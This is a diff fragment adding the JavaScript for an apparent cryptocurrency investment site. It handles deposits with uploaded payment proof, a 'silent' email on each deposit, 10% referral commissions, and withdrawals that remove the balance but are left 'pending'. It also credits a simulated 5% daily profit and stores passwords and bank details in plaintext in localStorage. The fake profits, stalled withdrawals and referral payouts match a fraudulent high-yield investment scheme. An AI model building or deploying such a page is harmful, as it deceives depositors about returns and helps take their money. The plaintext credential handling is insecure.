+            document.getElementById('processing-text').textContent = 'Processing your deposit (5 minutes)...';
+            
+            // Send silent email confirmation
+            sendSilentEmail(currentUser.email, amount);
+            
+            // Simulate 5 minute processing
+            setTimeout(() => {
+                // Add to balance
+                currentUser.balance += amount;
+                localStorage.setItem('cryptoUser', JSON.stringify(currentUser));
+                
+                // Add transaction
+                const newTransaction = {
+                    type: 'deposit',
+                    amount,
+                    date: new Date().toISOString(),
+                    status: 'completed'
+                };
+                
+                transactions.unshift(newTransaction);
+                localStorage.setItem(`transactions_${currentUser.email}`, JSON.stringify(transactions));
+                
+                // Update referral if this is first deposit
+                if (transactions.filter(tx => tx.type === 'deposit').length === 1 && currentUser.referredBy) {
+                    const allUsers = JSON.parse(localStorage.getItem('cryptoUsers')) || [];
+                    const referringUser = allUsers.find(u => u.referralCode === currentUser.referredBy);
+                    
+                    if (referringUser) {
+                        const referrals = JSON.parse(localStorage.getItem(`referrals_${currentUser.referredBy}`)) || [];
+                        const referralIndex = referrals.findIndex(r => r.email === currentUser.email);
+                        
+                        if (referralIndex !== -1) {
+                            referrals[referralIndex].deposits += amount;
+                            localStorage.setItem(`referrals_${currentUser.referredBy}`, JSON.stringify(referrals));
+                            
+                            // Update referring user's balance with 10% commission
+                            referringUser.balance += amount * 0.1;
+                            localStorage.setItem('cryptoUsers', JSON.stringify(allUsers));
+                            
+                            // Add transaction for referring user
+                            const referringUserTransactions = JSON.parse(localStorage.getItem(`transactions_${referringUser.email}`)) || [];
+                            referringUserTransactions.unshift({
+                                type: 'referral',
+                                amount: amount * 0.1,
+                                date: new Date().toISOString(),
+                                status: 'completed',
+                                from: currentUser.email
+                            });
+                            localStorage.setItem(`transactions_${referringUser.email}`, JSON.stringify(referringUserTransactions));
+                        }
+                    }
+                }
+                
+                // Hide processing overlay
+                processingOverlay.style.display = 'none';
+                
+                // Show success notification
+                showNotification(`Deposit of $${amount.toFixed(2)} successful!`, 'success');
+                
+                // Close modal
+                closeModal('deposit-modal');
+                
+                // Reset form
+                document.getElementById('deposit-amount').value = '';
+                document.getElementById('payment-proof').value = '';
+                proofPreview.style.display = 'none';
+                
+                // Update UI
+                updateUserData();
+                
+            }, 300000); // 5 minutes in milliseconds
+        }
+        
+        function processWithdrawal() {
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            const address = document.getElementById('withdraw-address').value;
+            
+            if (!amount || amount <= 0) {
+                showNotification('Please enter a valid amount', 'error');
+                return;
+            }
+            
+            if (amount > currentUser.balance) {
+                showNotification('Insufficient balance', 'error');
+                return;
+            }
+            
+            if (!address) {
+                showNotification('Please enter wallet address', 'error');
+                return;
+            }
+            
+            // Show processing overlay with different text
+            processingOverlay.style.display = 'flex';
+            document.getElementById('processing-text').textContent = 'Your request is submitted. Please wait...';
+            
+            // Simulate processing
+            setTimeout(() => {
+                // Deduct from balance
+                currentUser.balance -= amount;
+                localStorage.setItem('cryptoUser', JSON.stringify(currentUser));
+                
+                // Add transaction
+                transactions.unshift({
+                    type: 'withdrawal',
+                    amount,
+                    date: new Date().toISOString(),
+                    status: 'pending',
+                    address
+                });
+                localStorage.setItem(`transactions_${currentUser.email}`, JSON.stringify(transactions));
+                
+                // Hide processing overlay
+                processingOverlay.style.display = 'none';
+                
+                // Show success notification
+                showNotification(`Withdrawal request of $${amount.toFixed(2)} submitted!`, 'success');
+                
+                // Close modal
+                closeModal('withdraw-modal');
+                
+                // Reset form
+                document.getElementById('withdraw-amount').value = '';
+                document.getElementById('withdraw-address').value = '';
+                
+                // Update UI
+                updateUserData();
+                
+            }, 3000); // 3 seconds for demo
+        }
+        
+        // Profile functions
+        function copyReferralCode() {
+            const code = document.getElementById('referral-code').textContent;
+            navigator.clipboard.writeText(code);
+            showNotification('Referral code copied!', 'success');
+        }
+        
+        function copyReferralLink() {
+            const link = document.getElementById('referral-link').textContent;
+            navigator.clipboard.writeText(link);
+            showNotification('Referral link copied!', 'success');
+        }
+        
+        function changePassword() {
+            const current = document.getElementById('current-password').value;
+            const newPass = document.getElementById('new-password').value;
+            const confirm = document.getElementById('confirm-password').value;
+            
+            if (!current || !newPass || !confirm) {
+                showNotification('Please fill all fields', 'error');
+                return;
+            }
+            
+            if (current !== currentUser.password) {
+                showNotification('Current password is incorrect', 'error');
+                return;
+            }
+            
+            if (newPass !== confirm) {
+                showNotification('New passwords do not match', 'error');
+                return;
+            }
+            
+            if (newPass.length < 6) {
+                showNotification('Password must be at least 6 characters', 'error');
+                return;
+            }
+            
+            // Update password
+            const users = JSON.parse(localStorage.getItem('cryptoUsers')) || [];
+            const userIndex = users.findIndex(u => u.email === currentUser.email);
+            
+            if (userIndex !== -1) {
+                users[userIndex].password = newPass;
+                localStorage.setItem('cryptoUsers', JSON.stringify(users));
+                
+                currentUser.password = newPass;
+                localStorage.setItem('cryptoUser', JSON.stringify(currentUser));
+                
+                showNotification('Password changed successfully', 'success');
+                closeModal('change-password-modal');
+                
+                // Reset form
+                document.getElementById('current-password').value = '';
+                document.getElementById('new-password').value = '';
+                document.getElementById('confirm-password').value = '';
+            }
+        }
+        
+        function saveBankDetails() {
+            const bankName = document.getElementById('bank-name').value;
+            const accountNumber = document.getElementById('account-number').value;
+            const accountName = document.getElementById('account-name').value;
+            const ibanSwift = document.getElementById('iban-swift').value;
+            
+            if (!bankName || !accountNumber || !accountName) {
+                showNotification('Please fill required fields', 'error');
+                return;
+            }
+            
+            bankDetails = {
+                bankName,
+                accountNumber,
+                accountName,
+                ibanSwift
+            };
+            
+            localStorage.setItem(`bankDetails_${currentUser.email}`, JSON.stringify(bankDetails));
+            showNotification('Bank details saved', 'success');
+            closeModal('bank-details-modal');
+        }
+        
+        // Simulate daily profit (for demo)
+        function simulateDailyProfit() {
+            if (!currentUser) return;
+            
+            const now = new Date();
+            const lastProfit = localStorage.getItem('lastProfitTime');
+            const nextProfit = getNextProfitTime();
+            
+            document.getElementById('next-profit-time').textContent = `Today at ${formatTime(nextProfit)}`;
+            
+            if (!lastProfit || (new Date(lastProfit) < nextProfit && now >= nextProfit)) {
+                const profitAmount = currentUser.balance * 0.05;
+                
+                if (profitAmount > 0) {
+                    currentUser.balance += profitAmount;
+                    localStorage.setItem('cryptoUser', JSON.stringify(currentUser));
+                    
+                    transactions.unshift({
+                        type: 'profit',
+                        amount: profitAmount,
+                        date: new Date().toISOString(),
+                        status: 'completed'
+                    });
+                    localStorage.setItem(`transactions_${currentUser.email}`, JSON.stringify(transactions));
+                    
+                    localStorage.setItem('lastProfitTime', new Date().toISOString());
+                    updateUserData();
+                    
+                    showNotification(`Daily profit of $${profitAmount.toFixed(2)} added!`, 'success');
+                }
+            }
+        }
+        
+        // Check for profit every minute
+        setInterval(simulateDailyProfit, 60000);
+        simulateDailyProfit(); // Run once on load
+    </script>
+</body>
+</html>
